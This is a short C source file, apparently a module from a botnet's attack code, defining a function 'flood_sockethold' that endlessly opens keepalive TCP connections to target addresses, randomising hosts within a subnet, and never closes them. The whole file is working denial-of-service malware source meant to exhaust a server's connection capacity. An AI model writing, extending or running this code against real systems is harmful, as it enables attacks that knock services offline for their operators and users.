#define _GNU_SOURCE

#include "../../attack.h"

void flood_sockethold(struct flood *flood)
{
    while (1)
    {

        int fd = 0;
        int keepAlive = 1;
        int i = 0;

        for (i = 0; i < flood->num_of_targets; i++)
        {
            setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &keepAlive, sizeof(keepAlive));

            if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
                return;

            flood->targets[i].sock_addr.sin_family = AF_INET;
            flood->targets[i].sock_addr.sin_port = htons(flood->settings->dest_port);

            if (flood->targets[i].netmask < 32)
                flood->targets[i].sock_addr.sin_addr.s_addr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));

            if (connect(fd, (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(flood->targets[i].sock_addr)) < 0)
                continue;
        }
    }
}
